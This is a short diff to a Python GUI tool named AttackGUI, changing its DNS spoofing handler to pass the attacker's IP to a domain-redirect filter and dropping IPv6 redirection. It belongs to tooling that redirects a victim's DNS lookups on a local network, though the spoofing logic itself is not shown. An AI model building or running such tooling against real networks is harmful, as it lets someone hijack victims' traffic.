@@ -260,10 +260,9 @@ class AttackGUI:
                 victim_ip = self.dns_victim_entry.get().strip()
                 server_ip = self.get_gateway_ipv4()
                 spoof_mac = self.get_attacker_mac()
-
+                attacker_ip = self.attacker_ipv4
                 domain = self.dns_domain_entry.get().strip().lower()
                 spoof_ip = self.dns_spoof_ip_entry.get().strip()
-                spoof_ipv6 = self.dns_spoof_ipv6_entry.get().strip() or None
 
                 if not victim_ip or not domain or not spoof_ip:
                     self.log("DNS attack error: missing required fields")
@@ -273,13 +272,12 @@ class AttackGUI:
                 self.log(f"  Victim: {victim_ip}")
                 self.log(f"  Domain: {domain}")
                 self.log(f"  Redirect IPv4 → {spoof_ip}")
-                self.log(f"  Redirect IPv6 → {spoof_ipv6 or 'disabled'}")
 
                 tracker = DNSDomainTracker(domain, self.log)
                 redirect = DomainRedirectFilter(
                     tracker,
+                    attacker_ip=attacker_ip,
                     spoof_ip=spoof_ip,
-                    spoof_ipv6=spoof_ipv6,
                     logger=self.log
                 )
 
